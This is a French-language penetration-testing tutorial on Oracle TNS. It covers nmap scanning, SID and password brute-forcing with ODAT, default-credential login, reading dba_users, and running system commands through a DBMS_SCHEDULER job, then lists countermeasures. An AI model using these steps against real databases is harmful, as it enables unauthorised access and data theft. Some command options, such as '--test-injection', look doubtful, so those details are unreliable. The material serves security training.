# Oracle TNS

### **Oracle TNS - Guide Complet  avec Commandes Fondamentales**

***

⚠️ **Avertissement :** Ce contenu est strictement destiné à un usage éducatif et éthique dans le domaine de la cybersécurité. Toute utilisation illégale ou malveillante est interdite et engage la seule responsabilité de l’utilisateur.

***

### **Introduction**

Le protocole **TNS (Transparent Network Substrate)** est utilisé par les bases de données Oracle pour la communication entre les clients et les serveurs. Ce protocole peut être mal configuré, rendant les bases vulnérables à des attaques comme la falsification, l’énumération ou l’exploitation directe. Ce guide explore les techniques pour interagir avec Oracle via TNS, effectuer des tests de sécurité, et identifier des vulnérabilités.

***

### **🚀 Étape 1 : Préparer l'Environnement**

**1.1 Identifier le Port TNS**

Par défaut, le service Oracle TNS écoute sur le port **1521** (TCP). Pour détecter les services TNS actifs, utilisez **Nmap** :

```bash
nmap -p 1521 -sV <target>
```

**Exemple de sortie :**

```arduino
1521/tcp open  oracle-tns  Oracle Database 19c
```

**Explications :**

* `1521` : Port standard pour Oracle TNS.
* `oracle-tns` : Service TNS détecté.

**1.2 Pré-requis**

* Un système Linux avec Python et les outils associés (comme **tnscmd** ou **ODAT**).
* Les permissions root pour exécuter certaines commandes réseau.

***

### **🛠️ Étape 2 : Énumération avec Oracle TNS**

**2.1 Utiliser tnscmd (Oracle TNS Commands)**

**tnscmd** est un outil spécialisé pour interroger les services TNS. Il est utile pour énumérer les services, tester la configuration, et découvrir des informations sur la base.

1.  **Installer tnscmd** : Téléchargez **tnscmd** depuis le dépôt GitHub :

    ```bash
    git clone https://github.com/quentinhardy/tnscmd.git
    cd tnscmd
    ```
2.  **Découvrir les Services Disponibles** : Pour énumérer les services disponibles sur un serveur Oracle :

    ```bash
    python3 tnscmd.py --host <target> --port 1521 --raw
    ```

    **Exemple** :

    ```bash
    python3 tnscmd.py --host 192.168.1.10 --port 1521 --raw
    ```

    **Sortie attendue** :

    ```kotlin
    Service "XE" has 1 instance(s).
      Instance "xe", status READY, has 1 handler(s) for this service...
    ```
3.  **Tester une Injection TNS** : Certaines configurations permettent des attaques d’injection TNS :

    ```bash
    python3 tnscmd.py --host <target> --port 1521 --test-injection
    ```

***

**2.2 Utiliser ODAT (Oracle Database Attacking Tool)**

ODAT est un outil plus complet pour interagir avec les bases Oracle via TNS.

1.  **Installer ODAT** : Téléchargez et installez ODAT :

    ```bash
    git clone https://github.com/quentinhardy/odat.git
    cd odat
    pip install -r requirements.txt
    ```
2.  **Lister les Services Oracle** : Pour découvrir les services Oracle :

    ```bash
    python3 odat.py tnscmd -s <target> -p 1521 --sid-list
    ```

    **Exemple** :

    ```bash
    python3 odat.py tnscmd -s 192.168.1.10 -p 1521 --sid-list
    ```

***

### **🔍 Étape 3 : Accès à la Base Oracle**

**3.1 Brute-Force des SIDs (System Identifiers)**

Les bases Oracle sont identifiées par des **SIDs**. Si le SID n’est pas connu, utilisez ODAT pour brute-forcer :

```bash
python3 odat.py sidguesser -s <target> -p 1521
```

**Exemple** :

```bash
python3 odat.py sidguesser -s 192.168.1.10 -p 1521
```

**3.2 Brute-Force des Comptes**

Une fois le SID identifié, brute-forcez les identifiants :

```bash
python3 odat.py passwordguesser -s <target> -p 1521 -d <SID>
```

**Exemple** :

```bash
python3 odat.py passwordguesser -s 192.168.1.10 -p 1521 -d XE
```

***

**3.3 Connexion à la Base avec SQLPlus**

SQLPlus est le client officiel pour interagir avec une base Oracle :

```bash
sqlplus <username>/<password>@<host>:1521/<SID>
```

**Exemple** :

```bash
sqlplus scott/tiger@192.168.1.10:1521/XE
```

***

### **🛠️ Étape 4 : Exploitation de la Base Oracle**

**4.1 Énumération des Tables**

Après connexion, affichez les tables disponibles :

```sql
SELECT table_name FROM all_tables;
```

***

**4.2 Lecture des Données**

Pour lire les données sensibles (par exemple, les utilisateurs et les mots de passe) :

```sql
SELECT * FROM dba_users;
```

***

**4.3 Exécution de Commandes Système**

Si vous disposez de permissions suffisantes, utilisez **DBMS\_SCHEDULER** pour exécuter des commandes système :

1.  Créez une tâche programmée :

    ```sql
    BEGIN
       DBMS_SCHEDULER.CREATE_JOB(
          job_name => 'shell_command',
          job_type => 'EXECUTABLE',
          job_action => '/bin/bash',
          enabled => TRUE);
    END;
    /
    ```
2.  Activez la tâche :

    ```sql
    BEGIN
       DBMS_SCHEDULER.RUN_JOB('shell_command');
    END;
    /
    ```

***

### **🔒 Étape 5 : Contre-Mesures et Sécurisation**

**5.1 Restreindre l'Accès TNS**

* Configurez un pare-feu pour restreindre l'accès au port **1521** uniquement aux IP autorisées.

**5.2 Désactiver les SIDs par Défaut**

* Modifiez la configuration Oracle pour éviter l'exposition des SIDs par défaut comme **XE** ou **ORCL**.

**5.3 Activer l’Audit TNS**

* Surveillez les connexions et les requêtes suspectes via les outils d’audit Oracle.

**5.4 Utiliser des Identifiants Forts**

* Remplacez les mots de passe par défaut comme `scott/tiger` par des valeurs robustes.

***

### **Résumé des Commandes Clés**

| Commande/outil                            | Description                               |
| ----------------------------------------- | ----------------------------------------- |
| `nmap -p 1521 -sV <target>`               | Scanner le port 1521 pour détecter TNS.   |
| `python3 tnscmd.py --host <target> --raw` | Énumérer les services Oracle via TNS.     |
| `python3 odat.py sidguesser ...`          | Brute-force des SIDs Oracle.              |
| `sqlplus <username>/<password>@...`       | Connexion à une base Oracle avec SQLPlus. |
| `SELECT * FROM dba_users;`                | Lire les utilisateurs de la base Oracle.  |

***

#### **Conclusion**

Ce guide fournit un cadre complet pour énumérer et interagir avec Oracle TNS dans le cadre d’un test de sécurité. Les étapes décrivent l’identification des services, l’exploitation des vulnérabilités, et les bonnes pratiques pour sécuriser les bases Oracle. Respectez toujours les règles légales et éthiques lors de l’utilisation de ces techniques.

***

**Liens utiles :**

* [Mentions légales](https://dika-1.gitbook.io/road-to-hacker/mentions-legales)
* [Politique de confidentialité](https://dika-1.gitbook.io/road-to-hacker/politique-de-confidentialite)
* [Contactez-nous](mailto:dika-road-to-hacker@protonmail.com)
